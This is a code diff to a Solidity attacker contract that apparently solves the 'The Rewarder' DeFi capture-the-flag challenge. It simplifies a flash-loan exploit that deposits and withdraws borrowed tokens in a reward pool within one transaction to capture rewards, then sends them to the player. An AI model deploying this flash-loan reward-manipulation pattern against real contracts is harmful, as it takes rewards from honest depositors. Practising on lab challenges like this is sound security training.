@@ -12,17 +12,14 @@ import { FlashLoanerPool } from "./FlashLoanerPool.sol";
 contract TheRewarderPoolAttacker {
     TheRewarderPool public pool;
     FlashLoanerPool public loaner;
-    TheRewarderPoolAttackerHelper[] public helpers;
+    TheRewarderPoolAttackerHelper public helper;
     address public player;
 
     constructor(TheRewarderPool pool_, FlashLoanerPool loaner_) {
         pool = pool_;
         loaner = loaner_;
         player = msg.sender;
-
-        for (uint i = 0; i < 5; i++) {
-            helpers.push(new TheRewarderPoolAttackerHelper());
-        }
+        helper = new TheRewarderPoolAttackerHelper();
     }
 
     function attack() external {
@@ -31,16 +28,8 @@ contract TheRewarderPoolAttacker {
 
     function receiveFlashLoan(uint256 amount) external {
         require(msg.sender == address(loaner), "Must come from loaner");
-
-        loaner.liquidityToken().transfer(address(helpers[0]), amount);
-
-        for (uint i = 0; i < helpers.length; i++) {
-            if (i >= helpers.length - 1) {
-                helpers[i].depositAndWithdraw(amount, address(0));
-            } else {
-                helpers[i].depositAndWithdraw(amount, address(helpers[i + 1]));
-            }
-        }
+        loaner.liquidityToken().transfer(address(helper), amount);
+        helper.depositAndWithdraw(amount);
     }
 }
 
@@ -51,18 +40,13 @@ contract TheRewarderPoolAttackerHelper {
         attacker = TheRewarderPoolAttacker(msg.sender);
     }
 
-    function depositAndWithdraw(uint256 amount, address next) external {
+    function depositAndWithdraw(uint256 amount) external {
         TheRewarderPool pool = attacker.pool();
         IERC20(pool.liquidityToken()).approve(address(pool), amount);
         pool.deposit(amount);
         pool.withdraw(amount);
         pool.rewardToken().transfer(attacker.player(), pool.rewardToken().balanceOf(address(this)));
-
-        if (next == address(0)) {
-            FlashLoanerPool loaner = attacker.loaner();
-            loaner.liquidityToken().transfer(address(loaner), amount);
-        } else {
-            IERC20(pool.liquidityToken()).transfer(next, amount);
-        }
+        FlashLoanerPool loaner = attacker.loaner();
+        loaner.liquidityToken().transfer(address(loaner), amount);
     }
 }
